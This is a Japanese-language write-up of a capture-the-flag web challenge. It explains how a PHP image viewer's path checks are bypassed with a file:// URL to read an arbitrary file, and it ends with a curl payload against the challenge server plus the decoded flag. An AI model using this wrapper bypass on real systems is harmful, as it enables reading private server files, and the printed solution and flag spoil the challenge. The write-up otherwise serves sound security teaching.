# Alpaca-Rangers writeup
<https://alpacahack.com/daily/challenges/alpaca-rangers?month=2026-02>

## 1. 概要
本問題はPHPで実装された画像ビューアアプリケーションにおけるLFI（Local File Inclusion）の脆弱性を突く問題です．

## 2. 問題の分析

### ファイル構成
問題ファイルにはWebサーバー内で稼働するPHPのソースコードおよび複数の画像ファイルが含まれています．

### ソースコードの確認
`index.php`のソースコードを確認するとGETパラメータ`img`を受け取り，指定されたパスのファイルを読み込んでいます．
変数`$targetPath`に対する検証処理において先頭文字が`/`や`\`であるかを確認しています．
また，ディレクトリトラバーサルを防ぐため`..`が含まれるかどうかも確認しています．
これらのチェックを通過すると`file_get_contents`関数によってファイルの内容が取得されます．

## 3. 脆弱性と攻略方針

### 脆弱性
本問題にはプロトコルラッパーに対する入力検証の不備に起因する任意のファイル読み込みの脆弱性が存在します．
パスの先頭文字のみを検証しているため`file://`などのURLスキームを指定することで絶対パスの禁止制限を回避できます．

### 攻略方針：
パラメータに`file:///flag.txt`を指定することで制限をバイパスし，サーバーのルートディレクトリに存在するフラグファイルの読み込みを試みます．
読み込まれたファイルの内容はBase64エンコードされてHTMLのimgタグ内に出力されるため，対象のデータを抽出してデコードを実行します．

## 4. エクスプロイトコード
```bash
# 1. 脆弱性を利用してflag.txtの内容が含まれたHTMLを取得します
curl -s "http://34.170.146.252:51136/?img=file:///flag.txt" | grep "data:text/plain;base64"

# 2. 抽出されたBase64文字列をデコードしてフラグを得ます
echo "QWxwYWNhe0FscGFjYV9ncmUzbl9hbmRfcDFua19jb20xbmdfczBvbn0=" | base64 -d
```
